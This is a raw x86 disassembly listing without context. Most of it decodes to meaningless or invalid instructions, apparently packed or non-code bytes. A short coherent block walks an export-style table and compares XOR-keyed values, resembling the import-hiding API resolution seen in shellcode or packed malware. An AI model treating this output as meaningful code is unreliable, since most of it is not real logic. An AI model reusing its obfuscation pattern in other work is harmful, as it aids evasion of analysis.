  4148d1:	std    
  4148d2:	bnd jnp 0x4148ac
  4148d5:	retf   
  4148d6:	xor    al,0x45
  4148d8:	aad    0xa0
  4148da:	dec    edx
  4148db:	std    
  4148dc:	in     eax,0x3c
  4148de:	sub    al,BYTE PTR [eax+0x68]
  4148e1:	inc    edi
  4148e2:	stos   DWORD PTR es:[edi],eax
  4148e3:	xor    al,0x21
  4148e5:	jns    0x414896
  4148e7:	cmc    
  4148e8:	test   DWORD PTR [ecx-0x37],edi
  4148eb:	xchg   eax,edi
  4148ed:	scas   al,BYTE PTR es:[edi]
  4148ee:	adc    ebp,DWORD PTR [edi+ebx*4]
  4148f1:	je     0x414893
  4148f3:	pop    ebx
  4148f4:	push   edi
  4148f5:	or     DWORD PTR [eax+edi*1],edx
  4148f8:	loop   0x4148e3
  4148fa:	loope  0x414904
  4148fc:	jae    0x414954
  4148fe:	pop    ecx
  4148ff:	sub    DWORD PTR [ebp+eiz*1-0x31],ebx
  414903:	cmc    
  414904:	adc    al,0xb4
  414906:	jb     0x41495e
  414908:	sub    eax,0xc5f83f26
  41490d:	push   edx
  41490e:	add    bh,BYTE PTR [ecx+eax*8-0x53]
  414912:	pop    ds
  414913:	jo     0x4148cd
  414915:	jp     0x414994
  414917:	pop    esp
  414918:	jo     0x41492b
  41491a:	pop    ss
  41491b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41491c:	mov    al,ah
  41491e:	add    dh,bh
  414920:	outs   dx,DWORD PTR ds:[esi]
  414921:	inc    esi
  414922:	lock or BYTE PTR [edi],al
  414925:	xchg   ebp,eax
  414926:	push   edi
  414927:	sbb    ch,dl
  414929:	inc    ebx
  41492a:	test   eax,0x635722e3
  41492f:	dec    BYTE PTR [ecx+0x71]
  414932:	push   ecx
  414933:	mov    ds:0x83cf8932,al
  414938:	shl    BYTE PTR [ebp-0x48],1
  41493b:	dec    edi
  41493c:	push   ecx
  41493d:	sub    ecx,DWORD PTR [edx+0x5e]
  414940:	(bad)  
  414941:	jnp    0x41490c
  414943:	imul   eax,DWORD PTR [edx+0x7b59bcf2],0x6e646f93
  41494d:	pop    eax
  41494e:	push   edi
  41494f:	jmp    0x9a61e14c
  414954:	neg    DWORD PTR [ebx]
  414956:	mov    esp,0xfa8dc3bd
  41495b:	dec    esi
  41495c:	dec    ebx
  41495d:	bound  eax,QWORD PTR [ecx+0x44463b1d]
  414963:	mov    bh,0x73
  414965:	(bad)
  414968:	jg     0x414988
  41496a:	add    edi,DWORD PTR [edx-0x3d91b01c]
  414970:	mov    ds:0xb003917a,eax
  414975:	aas    
  414976:	call   0x7716d0bd
  41497b:	mov    edx,0x75fc2908
  414980:	(bad)  
  414981:	inc    ebp
  414982:	sub    ecx,DWORD PTR [ebp-0x62]
  414985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414986:	scas   eax,DWORD PTR es:[edi]
  414987:	xchg   esi,eax
  414988:	push   cs
  414989:	shr    ebp,1
  41498b:	inc    edi
  41498c:	popa   
  41498d:	std    
  41498e:	mov    ebp,?
  414990:	stc    
  414991:	nop
  414992:	inc    eax
  414993:	les    ecx,FWORD PTR [edi-0x5f]
  414996:	and    DWORD PTR [ebx+0x1d],esp
  414999:	inc    edi
  41499a:	push   esi
  41499b:	imul   esi,DWORD PTR [eiz*8+0x2182733f],0x482fbb66
  4149a6:	push   esi
  4149a7:	push   eax
  4149a8:	xor    eax,0x1535ddc8
  4149ad:	sub    al,0x7e
  4149af:	scas   al,BYTE PTR es:[edi]
  4149b0:	push   esi
  4149b1:	sbb    edi,0xffffffb4
  4149b4:	xchg   DWORD PTR [esi+eax*8],ebx
  4149b7:	mov    ah,0x32
  4149b9:	add    eax,0xf47c67a6
  4149be:	(bad)  
  4149c0:	add    DWORD PTR [ebp+0x2a],esi
  4149c3:	push   ss
  4149c4:	stc    
  4149c5:	lds    ebx,FWORD PTR [eax]
  4149c7:	adc    eax,0x5eb46ad
  4149cc:	adc    ebx,DWORD PTR [ebp-0x461139b]
  4149d2:	sbb    esi,DWORD PTR [ecx-0x6a7da1ad]
  4149d8:	and    DWORD PTR [ebp-0x55],ecx
  4149db:	xchg   ecx,eax
  4149dc:	js     0x414971
  4149de:	or     esi,DWORD PTR ds:0xdf5198f
  4149e4:	dec    eax
  4149e5:	mov    edi,0x809e4a5
  4149ea:	add    DWORD PTR [edi],0x53
  4149ed:	mov    ch,0x29
  4149ef:	mov    al,ds:0x27bf671c
  4149f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f5:	fdiv   DWORD PTR [ecx-0x6b]
  4149f8:	add    dh,BYTE PTR [esi+esi*2]
  4149fb:	xor    eax,0x15a766d5
  414a00:	aam    0x82
  414a02:	jmp    0x41499f
  414a04:	rcr    DWORD PTR [esi+0x2874f322],0x30
  414a0b:	mov    ah,0x48
  414a0d:	fstp   QWORD PTR [ecx]
  414a0f:	sub    bl,bh
  414a11:	mov    cl,0x25
  414a13:	pop    ds
  414a14:	call   0x23264eb5
  414a19:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  414a1b:	mov    ecx,0xcec3492f
  414a20:	or     al,0x29
  414a22:	inc    edi
  414a23:	int    0x46
  414a25:	fcomp  st(1)
  414a27:	pusha  
  414a28:	dec    ecx
  414a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a2a:	sub    DWORD PTR [eax-0x1bd5085f],edi
  414a30:	cmc    
  414a31:	push   ss
  414a32:	and    DWORD PTR [ebx-0x31e7d3d6],esi
  414a38:	mov    gs,WORD PTR [edi+0xf]
  414a3b:	add    DWORD PTR [eax-0x1d],ebp
  414a3e:	out    0x4e,al
  414a40:	test   eax,0xa0ea25b3
  414a45:	dec    edi
  414a46:	mov    ds:0xd0214cf0,al
  414a4b:	xchg   edi,eax
  414a4c:	pop    esp
  414a4d:	aas    
  414a4e:	jo     0x414ab0
  414a50:	outs   dx,BYTE PTR ds:[esi]
  414a51:	dec    edi
  414a52:	xchg   esp,eax
  414a53:	pushf  
  414a54:	iret   
  414a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a56:	cmp    al,0xc0
  414a58:	(bad)  
  414a59:	fwait
  414a5a:	stc    
  414a5b:	lds    esi,FWORD PTR [esi+0x4dd62630]
  414a61:	push   esp
  414a62:	inc    ebp
  414a63:	or     al,0x30
  414a65:	lahf   
  414a66:	icebp  
  414a67:	dec    ebp
  414a68:	mov    ds:0x25c6f12d,al
  414a6d:	lea    edx,[esi+edx*4-0x7669b5bb]
  414a74:	mov    edi,0xb50fbaee
  414a79:	mov    WORD PTR [edi],?
  414a7b:	cmp    bl,dl
  414a7d:	push   esi
  414a7e:	pop    eax
  414a7f:	outs   dx,BYTE PTR ds:[esi]
  414a80:	(bad)  [ebx+0x1aaee650]
  414a86:	jo     0x414a7b
  414a88:	hlt    
  414a89:	dec    esp
  414a8a:	lea    edi,[ebp-0x78]
  414a8d:	dec    BYTE PTR [esp+ebp*1+0x53]
  414a91:	js     0x414b04
  414a93:	inc    esp
  414a94:	add    ch,ah
  414a96:	imul   edi,esp,0xc
  414a99:	(bad)  [eax]
  414a9b:	add    eax,0xbb810e35
  414aa0:	loop   0x414aa8
  414aa2:	mov    al,0x53
  414aa4:	(bad)  
  414aa5:	in     al,dx
  414aa6:	inc    ebp
  414aa7:	xchg   edx,eax
  414aa8:	mov    dh,cl
  414aaa:	add    DWORD PTR [eax],ecx
  414aac:	jp     0x414b16
  414aae:	xchg   ah,bh
  414ab0:	ins    DWORD PTR es:[edi],dx
  414ab1:	js     0x414b00
  414ab3:	out    0xed,eax
  414ab5:	or     BYTE PTR [eax+0x74fbc6c3],bl
  414abb:	iret   
  414abc:	lahf   
  414abd:	in     al,dx
  414abe:	cwde   
  414abf:	add    ebx,DWORD PTR [ebx-0x7c2065bb]
  414ac5:	and    BYTE PTR [ebp-0x3e19fa07],dl
  414acb:	retf   0xcff6
  414ace:	xchg   edx,eax
  414acf:	sub    esi,ecx
  414ad1:	fild   DWORD PTR [eax]
  414ad3:	in     eax,0x36
  414ad5:	cld    
  414ad6:	repnz outs dx,BYTE PTR ds:[esi]
  414ad8:	dec    edi
  414ad9:	je     0x414ae7
  414adb:	aam    0x3c
  414add:	mov    ch,0x36
  414adf:	dec    ebx
  414ae0:	mov    ds:0xeb07e0f0,eax
  414ae5:	pop    ecx
  414ae6:	adc    DWORD PTR [edx+esi*1],ebp
  414ae9:	dec    ebx
  414aea:	xchg   DWORD PTR [edi-0x17],ebp
  414aed:	outs   dx,DWORD PTR ds:[esi]
  414aee:	sbb    ch,BYTE PTR [ecx]
  414af0:	jne    0x414aff
  414af2:	cli    
  414af3:	scas   eax,DWORD PTR es:[edi]
  414af4:	int3   
  414af5:	jge    0x414b25
  414af7:	cmp    DWORD PTR [eax],edi
  414af9:	imul   BYTE PTR [edx-0x338ee764]
  414aff:	jo     0x414aca
  414b01:	cld    
  414b02:	and    eax,0x47671985
  414b07:	loopne 0x414afc
  414b09:	mov    esi,0xec6e941c
  414b0e:	xchg   ebp,eax
  414b0f:	sub    eax,0x31ac2329
  414b14:	push   es
  414b15:	popf   
  414b16:	xchg   ebx,eax
  414b17:	jno    0x414ab5
  414b19:	(bad)  
  414b1a:	fucom  st(5)
  414b1c:	hlt    
  414b1d:	sbb    DWORD PTR [eax],esi
  414b1f:	mov    dl,dl
  414b21:	sub    dh,dl
  414b23:	jmp    0xf63b:0xccd01621
  414b2a:	mov    esi,0x8f86f2b8
  414b2f:	in     al,dx
  414b30:	jl     0x414ba5
  414b32:	jg     0x414b37
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	les    ebp,FWORD PTR [ebp-0x3d]
  414bb9:	mov    bh,0x5b
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b72
  414bc3:	fadd   DWORD PTR [eax-0x41b7af04]
  414bc9:	(bad)  
  414bcb:	pmuludq mm0,mm3
  414bce:	jmp    0x414c06
  414bd0:	test   al,0x8b
  414bd2:	inc    ebx
  414bd3:	dec    eax
  414bd4:	xchg   edi,eax
  414bd5:	sti    
  414bd6:	pusha  
  414bd7:	(bad)  
  414bd8:	(bad)  [eax]
  414bda:	sub    ch,ch
  414bdc:	(bad)  
  414bdd:	or     eax,0xf6d3e949
  414be2:	shr    ch,cl
  414be4:	push   edx
  414be5:	lock cmc 
  414be7:	add    bh,BYTE PTR ds:[eax+0x33]
  414beb:	jmp    0x414bf4
  414bed:	pop    esi
  414bee:	shl    BYTE PTR [edx],cl
  414bf0:	or     edi,DWORD PTR [esi-0x13]
  414bf3:	or     bl,dh
  414bf5:	sar    dl,1
  414bf7:	(bad)  
  414bf8:	pushf  
  414bf9:	test   esi,esi
  414bfb:	call   0x5113e26e
  414c00:	sbb    esi,DWORD PTR [eax]
  414c02:	shr    esi,1
  414c04:	dec    ecx
  414c05:	inc    esp
  414c06:	stc    
  414c07:	js     0x414c11
  414c09:	shl    DWORD PTR [ecx+eiz*1+0x38c20f16],1
  414c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c11:	sbb    bl,BYTE PTR [eax+0x33974464]
  414c17:	daa    
  414c18:	mov    al,ds:0x8243a912
  414c1d:	inc    ebx
  414c1e:	pop    ss
  414c1f:	jnp    0x414bbf
  414c21:	fmul   QWORD PTR [eax+0x7b]
  414c24:	jl     0x414c65
  414c26:	mov    ebp,0x5580e6e9
  414c2b:	sbb    bl,BYTE PTR [esi+esi*1]
  414c2e:	cld    
  414c2f:	adc    bl,BYTE PTR [ecx-0x6f]
  414c32:	push   cs
  414c33:	inc    edi
  414c35:	(bad)  
  414c36:	retf   0xb2d8
  414c39:	inc    eax
  414c3a:	cld    
  414c3b:	sub    BYTE PTR [esi+0x75],0x60
  414c3f:	push   ds
  414c40:	sbb    eax,0x72fff6ab
  414c45:	push   ecx
  414c46:	mov    dh,0x26
  414c48:	loope  0x414c34
  414c4a:	cld    
  414c4b:	(bad)  
  414c4c:	and    ch,al
  414c4e:	or     al,0xa8
  414c50:	mov    al,ds:0x8313b703
  414c55:	push   eax
  414c56:	icebp  
  414c57:	fild   WORD PTR [edx]
  414c59:	ret    0xa628
  414c5c:	mov    ?,WORD PTR [esi-0x4f4e773e]
  414c62:	in     al,dx
  414c63:	inc    esi
  414c64:	scas   eax,DWORD PTR es:[edi]
  414c65:	cmp    al,0xa8
  414c67:	aad    0xaf
  414c69:	add    cl,BYTE PTR [ecx+edi*1+0x3deb563e]
  414c70:	repnz dec eax
  414c72:	and    al,BYTE PTR [ecx]
  414c74:	jno    0x414c38
  414c76:	loop   0x414c4c
  414c78:	bound  esi,QWORD PTR [ebp+0x14]
  414c7b:	aas    
  414c7c:	mov    bl,0x15
  414c7e:	cmp    DWORD PTR [edx],eax
  414c80:	aam    0x69
  414c82:	dec    DWORD PTR [eax+esi*4]
  414c85:	cmp    ebp,esi
  414c87:	jg     0x414c58
  414c89:	and    ch,al
  414c8b:	retf   
  414c8c:	push   eax
  414c8d:	xchg   ebp,eax
  414c8e:	ret    
  414c8f:	retf   
  414c90:	stc    
  414c91:	and    BYTE PTR [ebx],bl
  414c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c94:	imul   ebx,DWORD PTR [ecx-0x56],0x75
  414c98:	and    DWORD PTR [eax-0x15],0xffffff9e
  414c9c:	lock xchg edx,eax
  414c9e:	sbb    bl,BYTE PTR [edx+ebp*2]
  414ca1:	or     bh,BYTE PTR [edx]
  414ca3:	mov    edx,DWORD PTR [eax-0x40]
  414ca6:	popf   
  414ca7:	or     ah,BYTE PTR [edi+0x1194502e]
  414cad:	pop    ebp
  414cae:	(bad)  
  414caf:	jle    0x414cd0
  414cb1:	jne    0x414d30
  414cb3:	adc    eax,0xd603f6e8
  414cb8:	dec    ecx
  414cb9:	pop    eax
  414cba:	in     eax,0x2c
  414cbc:	jbe    0x414c94
  414cbe:	fcmovnb st,st(1)
  414cc0:	and    eax,0xda26a342
  414cc5:	push   es
  414cc6:	aam    0x48
  414cc8:	add    eax,0x63c92556
  414ccd:	loopne 0x414c7f
  414ccf:	shr    BYTE PTR [edx],1
  414cd1:	push   edi
  414cd2:	jbe    0x414d47
  414cd4:	jle    0x414cd6
  414cd6:	call   0x3b20d22d
  414cdb:	dec    ebp
  414cdc:	xchg   esp,eax
  414cdd:	adc    al,BYTE PTR [ebx-0x371b3de8]
  414ce3:	inc    edx
  414ce4:	or     ah,BYTE PTR [edx-0x36]
  414ce7:	and    dl,BYTE PTR [ebp-0x4a]
  414cea:	mov    edi,0x1eab006a
  414cef:	test   eax,0x444d22d5
  414cf4:	xor    ebp,ebp
  414cf6:	cmp    eax,0xaa7dff1a
  414cfb:	ret    0xe338
  414cfe:	xchg   ebp,eax
  414cff:	pop    ebp
  414d00:	push   ebp
  414d01:	pop    eax
  414d02:	sbb    DWORD PTR [edi+0xae04861],0xffffffcb
  414d09:	mov    ch,0x3e
  414d0b:	ret    0xd870
  414d0e:	call   0xa0c254fa
  414d13:	mov    al,0x36
  414d15:	adc    al,0xe9
  414d17:	imul   ecx,DWORD PTR [edi-0x224ed3d2],0xffffff93
  414d1e:	inc    ecx
  414d1f:	cmp    al,0x4c
  414d21:	push   ebx
  414d22:	xor    eax,0x79ecc4cb
  414d27:	mov    ds:0x3136e089,eax
  414d2c:	mov    ch,0xa2
  414d2e:	imul   ebp,DWORD PTR [eax],0xcdf2e7e1
  414d34:	xchg   esp,eax
  414d35:	stos   DWORD PTR es:[edi],eax
  414d36:	inc    DWORD PTR [ecx+edi*4]
  414d39:	iret   
  414d3a:	and    ecx,ebp
  414d3c:	(bad)
  414d40:	or     DWORD PTR [ecx+0x17],ebx
  414d43:	or     esp,DWORD PTR es:[edx+esi*1-0x35]
  414d48:	jmp    0x414d1e
  414d4a:	jmp    0x414cf8
  414d4c:	or     bh,BYTE PTR [eax*8+0x5e7c4f86]
  414d53:	popa   
  414d54:	(bad)  
  414d55:	jl     0x414d47
  414d57:	repnz scas eax,DWORD PTR es:[edi]
  414d59:	push   cs
  414d5a:	aam    0x31
  414d5c:	add    eax,0x8bc4adcf
  414d61:	pop    esi
  414d62:	mov    bh,0x42
  414d64:	out    dx,al
  414d65:	sub    esi,DWORD PTR [eax]
  414d67:	into   
  414d68:	push   0xffffff86
  414d6a:	adc    eax,0x86a3bd7b
  414d70:	jne    0x414d51
  414d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d73:	int3   
  414d74:	push   edi
  414d75:	scas   al,BYTE PTR es:[edi]
  414d76:	jl     0x414d65
  414d78:	mov    DWORD PTR [ebx],edi
  414d7a:	pop    edx
  414d7b:	sub    BYTE PTR [edx],bl
  414d7d:	mov    dl,0x41
  414d7f:	push   esp
  414d80:	test   al,0xdf
  414d82:	gs xchg ebp,ecx
  414d85:	sar    DWORD PTR [edx],0xde
  414d88:	call   0xd22a:0xe5b0c4ac
  414d8f:	inc    eax
  414d90:	mov    edx,0x95095004
  414d95:	pusha  
  414d96:	mov    eax,ds:0xa41672f4
  414d9b:	je     0x414d32
  414d9d:	out    dx,eax
  414d9e:	sahf   
  414d9f:	lea    edx,[edx-0x1e]
  414da2:	lahf   
  414da3:	and    ah,BYTE PTR [ecx+0x72]
  414da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da7:	mov    ?,WORD PTR [eax]
  414da9:	fist   DWORD PTR [esi]
  414dab:	sub    al,0xdc
  414dad:	or     cl,BYTE PTR [edx+ebp*8-0x5]
  414db1:	hlt    
  414db2:	mov    esp,0x3ffc5023
  414db7:	out    0x4d,eax
  414db9:	das    
  414dba:	js     0x414e01
  414dbc:	and    DWORD PTR [ebp-0x2b864607],edx
  414dc2:	xchg   DWORD PTR [ebp-0x2176be5],eax
  414dc8:	cli    
  414dc9:	and    DWORD PTR [esi+0x49],esp
  414dcc:	jno    0x414e0c
  414dce:	push   esi
  414dcf:	scas   al,BYTE PTR es:[edi]
  414dd0:	shl    cl,0xed
  414dd3:	fdivr  st(1),st
  414dd5:	or     eax,0x67e498e2
  414dda:	xchg   edx,eax
  414ddb:	dec    esp
  414ddc:	sub    ecx,DWORD PTR [ebp-0x2]
  414ddf:	jo     0x414da1
  414de1:	inc    esi
  414de2:	in     al,0x95
  414de4:	mov    BYTE PTR [ebx],dl
  414de6:	ret    
  414de7:	adc    BYTE PTR [ecx+0x5b],0x3e
  414deb:	loope  0x414e4c
  414ded:	iret   
  414dee:	push   esp
  414def:	add    BYTE PTR [edi+0x5d442ad8],ch
  414df5:	add    dl,dh
  414df7:	iret   
  414df8:	dec    ebx
  414df9:	inc    ecx
  414dfa:	in     al,dx
  414dfb:	(bad)  
  414dfc:	not    BYTE PTR [ebp-0x36]
  414dff:	and    ch,BYTE PTR [esi+0x70]
  414e02:	lods   eax,DWORD PTR ds:[esi]
  414e03:	jecxz  0x414e3f
  414e05:	mov    eax,ds:0x880c2b74
  414e0a:	fisubr WORD PTR [edi+eiz*1-0x40]
  414e0e:	or     eax,0xafec91c
  414e13:	lahf   
  414e14:	or     BYTE PTR [edx+0x56ca6b39],ch
  414e1a:	test   ebp,0x8dd8c495
  414e20:	aaa    
  414e21:	mov    ah,0xa6
  414e23:	scas   al,BYTE PTR es:[edi]
  414e24:	or     BYTE PTR [eax-0x1c],ch
  414e27:	fild   QWORD PTR [ebx]
  414e29:	js     0x414e0f
  414e2b:	mov    dl,0x64
  414e2d:	adc    al,dh
  414e2f:	xor    edx,ecx
  414e31:	cmp    eax,0xf90f94b4
  414e36:	fsub   st(4),st
  414e38:	shl    DWORD PTR [ecx+0x45],1
  414e3b:	add    BYTE PTR [edi+0x37c21667],cl
  414e41:	(bad)  
  414e42:	mov    edi,0x9e6ae413
  414e47:	pop    ss
  414e48:	sbb    eax,0xe2a24506
  414e4d:	nop
  414e4e:	outs   dx,DWORD PTR ds:[esi]
  414e4f:	dec    esp
  414e50:	repnz mov cl,0xe
  414e53:	add    eax,0xb08cbc0
  414e58:	xor    ah,BYTE PTR [ebp-0x30]
  414e5b:	jmp    0x414e6f
  414e5d:	into   
  414e5e:	inc    edx
  414e5f:	pop    edi
  414e60:	arpl   WORD PTR [ecx+ecx*1+0x76],si
  414e64:	aad    0x50
  414e66:	adc    cl,BYTE PTR [ebx]
  414e68:	cmp    al,0xfa
  414e6a:	cmp    al,BYTE PTR [ebp-0x57]
  414e6d:	lods   al,BYTE PTR ds:[esi]
  414e6e:	js     0x414ede
  414e70:	fcom   DWORD PTR [esi+edi*8-0x7e7b088a]
  414e77:	shr    ch,cl
  414e79:	fidivr DWORD PTR [ebp-0x17]
  414e7c:	push   eax
  414e7d:	sub    DWORD PTR [ecx+0x75],edx
  414e80:	inc    ebp
  414e81:	push   cs
  414e82:	inc    edi
  414e83:	mov    esi,0xc210e9bb
  414e88:	je     0x414ee3
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	adc    ebp,DWORD PTR [esp+eiz*4]
  414eaf:	add    esp,DWORD PTR [eax+edi*2+0x7eb9707f]
  414eb6:	jo     0x414f28
  414eb8:	mov    cs,WORD PTR ds:0xd52ca7fb
  414ebe:	call   0x1b80:0x5681018b
  414ec5:	adc    ebx,esp
  414ec7:	jne    0x414eb3
  414ec9:	pop    ebp
  414eca:	sub    BYTE PTR [esi],dl
  414ecc:	stos   BYTE PTR es:[edi],al
  414ecd:	inc    BYTE PTR [ebp-0x358f95c0]
  414ed3:	sahf   
  414ed4:	outs   dx,DWORD PTR ds:[esi]
  414ed5:	ins    BYTE PTR es:[edi],dx
  414ed6:	ds iret 
  414ed8:	ins    BYTE PTR es:[edi],dx
  414ed9:	sub    eax,ebp
  414edb:	cmp    BYTE PTR [eax-0x77],ah
  414ede:	jae    0x414ef3
  414ee0:	sub    al,0x61
  414ee2:	int    0x2a
  414ee4:	pop    es
  414ee5:	nop
  414ee6:	push   ebp
  414ee7:	mov    esi,cs
  414ee9:	xchg   esi,eax
  414eea:	mov    ah,0xac
  414eec:	ja     0x414ea3
  414eee:	push   0xb900d5f5
  414ef3:	sbb    cl,0x9c
  414ef6:	and    al,0xcd
  414ef8:	mov    esi,0xa64f5e00
  414efd:	mov    ecx,0xa9ce37cf
  414f02:	cdq    
  414f03:	fisttp WORD PTR [esi+0x47ef6f1e]
  414f09:	imul   ecx,DWORD PTR [edx],0xffffffd2
  414f0c:	sub    DWORD PTR [ecx],0x44
  414f0f:	add    ch,ah
  414f11:	pop    ecx
  414f12:	ds test al,0xbe
  414f15:	shl    BYTE PTR [esi-0x30],cl
  414f18:	xchg   esp,eax
  414f19:	scas   eax,DWORD PTR es:[edi]
  414f1a:	pop    eax
  414f1b:	leave  
  414f1c:	dec    edx
  414f1d:	ret    
  414f1e:	(bad)  
  414f1f:	jmp    0x414f8e
  414f21:	mov    edx,0x5775111a
  414f26:	mov    dh,0x4e
  414f28:	or     ah,bh
  414f2a:	jae    0x414f8f
  414f2c:	call   0xddeb64e4
  414f31:	je     0x414f1d
  414f33:	in     eax,0xf5
  414f35:	nop
  414f36:	mov    ecx,0xb6b4903
  414f3b:	mov    ebp,0x662a05e5
  414f40:	mov    WORD PTR [eax+0x9],gs
  414f43:	xor    dh,BYTE PTR [ebp+0x2b843c50]
  414f49:	push   esp
  414f4a:	(bad)  
  414f4b:	cld    
  414f4c:	lea    ebx,[ecx-0x3eebb976]
  414f52:	imul   ebx,ebp,0x34
  414f55:	xor    DWORD PTR [ebx+0x1444c67d],ebx
  414f5b:	outs   dx,BYTE PTR ds:[esi]
  414f5c:	out    dx,al
  414f5d:	xchg   ebx,eax
  414f5e:	xor    al,al
  414f60:	mov    bl,0xe5
  414f62:	js     0x414f6b
  414f64:	xchg   BYTE PTR [esi-0xbd830d],bl
  414f6a:	loop   0x414fe3
  414f6c:	mov    eax,0x4da18d9f
  414f71:	mov    edx,0x1d7c6dfb
  414f76:	jp     0x414f6e
  414f78:	inc    esp
  414f79:	sbb    ebp,esp
  414f7b:	ja     0x414f62
  414f7d:	cmp    dl,0x7b
  414f80:	and    DWORD PTR [edx-0x76],ecx
  414f83:	not    dl
  414f85:	jp     0x414f3d
  414f87:	fild   WORD PTR [esi+0x15]
  414f8a:	xor    al,dh
  414f8c:	shr    DWORD PTR [ebx+edx*2-0x7cac45f0],cl
  414f93:	mov    eax,ds:0x16dd0d20
  414f98:	push   cs
  414f99:	or     eax,0xf9dd85df
  414f9e:	sub    edx,DWORD PTR [edx]
  414fa0:	dec    eax
  414fa1:	aaa    
  414fa2:	call   0xd3ded6ac
  414fa7:	repz fnstcw WORD PTR [edi+0x66]
  414fab:	jns    0x414fa5
  414fad:	mov    ebp,0xc3bf0ad
  414fb2:	aam    0xda
  414fb4:	seta   BYTE PTR [edx]
  414fb7:	out    dx,eax
  414fb8:	shr    ah,cl
  414fba:	(bad)  
  414fbb:	push   edx
  414fbc:	jge    0x415023
  414fbe:	stc    
  414fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc0:	and    BYTE PTR [edi+0x5f],dl
  414fc3:	fs pop ebp
  414fc5:	add    esp,DWORD PTR [edx-0x1f]
  414fc8:	dec    edi
  414fc9:	div    BYTE PTR [ebp-0x7473bdd5]
  414fcf:	scas   eax,DWORD PTR es:[edi]
  414fd0:	out    0x2a,al
  414fd2:	xor    DWORD PTR [ecx-0x38b190f0],ebp
  414fd8:	repz push esp
  414fda:	(bad)  
  414fdb:	dec    esi
  414fdc:	xor    edi,eax
  414fde:	mov    WORD PTR [edx+ecx*8],cs
  414fe1:	outs   dx,BYTE PTR ds:[esi]
  414fe2:	and    al,0x5d
  414fe4:	int    0xb2
  414fe6:	loopne 0x415049
  414fe8:	popf   
  414fe9:	dec    ebx
  414fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414feb:	sbb    DWORD PTR [eax+0x2cf1ea40],esp
  414ff1:	ins    BYTE PTR es:[edi],dx
  414ff2:	inc    edx
  414ff3:	shl    DWORD PTR [esi],cl
  414ff5:	out    dx,eax
  414ff6:	push   ebp
  414ff7:	test   eax,0x2ef39f99
  414ffc:	repz pushf 
  414ffe:	loopne 0x41507c
  415000:	adc    edx,0x4fa03bf8
  415006:	xchg   esp,eax
  415007:	sub    ecx,DWORD PTR [ebx+eax*4]
  41500a:	xor    BYTE PTR [esi-0x47],dl
  41500d:	stos   BYTE PTR es:[edi],al
  41500e:	adc    DWORD PTR [esi-0x2d],esi
  415011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415012:	pop    ecx
  415013:	lock mov ds:0xb87fce87,al
  415019:	enter  0xd4d8,0xf6
  41501d:	add    eax,0x8eabeb0e
  415022:	repz lds eax,FWORD PTR [esi]
  415025:	fbld   TBYTE PTR [ebp+0x2f951163]
  41502b:	xchg   esi,eax
  41502c:	xchg   esp,eax
  41502d:	inc    edi
  41502e:	xor    al,BYTE PTR [eax+edx*2+0x68]
  415032:	pop    ebx
  415033:	icebp  
  415034:	inc    esi
  415035:	fcom   QWORD PTR [edi+0x6bda0c94]
  41503b:	ret    
  41503c:	jp     0x414fc5
  41503e:	dec    ebx
  41503f:	aas    
  415040:	rcr    DWORD PTR ds:0x30b58b03,cl
  415046:	test   bl,ch
  415048:	dec    BYTE PTR ds:0x4d4385fe
  41504e:	jg     0x4150a5
  415050:	jno    0x415030
  415052:	push   0x4d7ae08b
  415057:	and    cl,BYTE PTR [esi+0x3dc23c79]
  41505d:	jl     0x4150b3
  41505f:	sbb    eax,0x53d19133
  415064:	mov    bh,0x24
